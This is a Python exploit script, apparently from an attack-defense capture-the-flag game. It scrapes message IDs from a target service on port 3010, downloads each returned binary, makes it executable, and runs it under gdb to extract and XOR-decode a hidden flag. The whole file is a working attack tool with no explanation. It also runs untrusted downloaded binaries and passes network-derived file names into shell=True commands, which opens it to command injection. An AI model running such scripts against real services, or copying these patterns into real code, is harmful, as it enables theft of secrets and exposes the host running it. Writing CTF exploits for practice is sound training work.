#!/usr/bin/env python3

import requests,sys,re,select
import subprocess as sp
import os
import stat
from struct import *
from threading import Timer

def debug_prt(s):
    sys.stderr.write(s+"\n")
def getep(fname):
    res1 = sp.Popen("readelf -a %s" % (fname,),shell=True,stdout=sp.PIPE,stderr=sp.PIPE)
    out = res1.communicate();
    a=re.findall(r'(0x[0-9a-f]+)',out[0].decode().split("\n")[10])
    ep = a[0]
    return ep
def getflag(fname):
    res1 = sp.Popen("sh -c 'gdb -silent -x deb.txt %s' < /dev/null " % (fname,),shell=True,stdout=sp.PIPE,stderr=sp.PIPE)
    timer = Timer(2, res1.kill)
    res_stdout,res_stderr=("","")
    try:
        timer.start()
        res_stdout,res_stderr = res1.communicate()
    finally:
        timer.cancel()
    if res1.returncode!=0:
        return ""
    res = res_stdout.decode()
    f1=re.findall(r'\$1 = (0x[0-9a-f]+)',res)
    if not f1:
        return ""
    f1=f1[0]
    f2=re.findall(r'\$2 = ([0-9]+)',res)[0]
    f3=re.findall(r'\$3 = \{(.+)\}',res,re.DOTALL)[0]
    f3 = [i for i in map(lambda x: int(x,16),re.findall(r'([x0-9a-f]+)',f3))]
    sz = int(f2,16)
    key = int(f1,16)
    res = []
    f3=f3[0:sz-6]
    for c in f3:
        res.append(chr((c ^ key) & 0xff))
    flag= "".join(res)
    return flag

def attack():
    ip = sys.argv[1]
    list_index = requests.get("http://%s:3010/list" %ip)
    refs = re.findall('message_id=([0-9A-Z]+)"',list_index.text)
    debug_prt (",".join(refs))
    for ref in refs:
        debug_prt("Downloading %s" % ("http://%s:3010/get?message_id=%s" %(ip,ref)))
        res = requests.get("http://%s:3010/get?message_id=%s" %(ip,ref),stream=True,timeout=5)
        debug_prt ("Executed")
        if res.status_code == 200:
            with open(ref, 'wb') as f:
                for chunk in res:
                    f.write(chunk)
            st = os.stat(ref)
            os.chmod(ref, st.st_mode | stat.S_IEXEC)
            debug_prt("Starting hack")
            flg = getflag(ref)
            if len(flg)>0:
                print(flg)
                continue
            debug_prt("One more time")
            print(getflag2(ref))
def getflag2(fname):
    res1 = sp.Popen("sh -c 'gdb -silent'",shell=True,stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.PIPE)

    res1.stdin.write(b"file %s\n" % fname.encode()); res1.stdin.flush()
    res1.stdin.write(b"set disassembly-flavor intel\n"); res1.stdin.flush()
    res1.stdin.write(b"set print repeats 0\n"); res1.stdin.flush()
    ep=getep(fname)
    ep_val = int(ep,16)
    keyval = ep_val + 0x1d
    keyval = hex(keyval)
    res1.stdin.write(b"b *%s\n" %(keyval.encode())); res1.stdin.flush()
    res1.stdin.write(b"run qweqwe\n"); res1.stdin.flush()
    for i in range(6):
        a=res1.stdout.readline()
    res1.stdin.write(b"info reg rdi\n"); res1.stdin.flush()
    a=res1.stdout.readline()
    aa = re.findall(r'0x[0-9a-f]+',a.decode())
    addr = aa[0]
    cmd="rwatch *%s\n" %(addr)
    res1.stdin.write(cmd.encode()); res1.stdin.flush()
    res1.stdin.write(b"c\n"); res1.stdin.flush()
    a=res1.stdout.readline();
    res1.stdin.write(b"x/20i $pc\n"); res1.stdin.flush()
    all_cont = ""
    for i in range(25):
        a=res1.stdout.readline()
        all_cont += a.decode()

    key = re.findall(r'cmp\s+e.x,(0x[0-9a-f]+)',all_cont)
    enc_mes = re.findall(r'mov\s+DWORD\s+PTR\s+\[rbp\+0x[0-9a-f]+\],(0x[0-9a-f]+)',all_cont)
    mkey = int(key[0],16)
    mmes = list(map(lambda x:int(x,16),enc_mes))
    vals = b""
    mkey = pack("<L",mkey)
    for c in mmes:
        vals+=pack("<L",c)
    decoded = []
    for i in range(len(vals)):
        decoded.append(chr(vals[i] ^ mkey[i%4]))
    flag = "".join(decoded).split("\n")[0]
    return flag
attack()
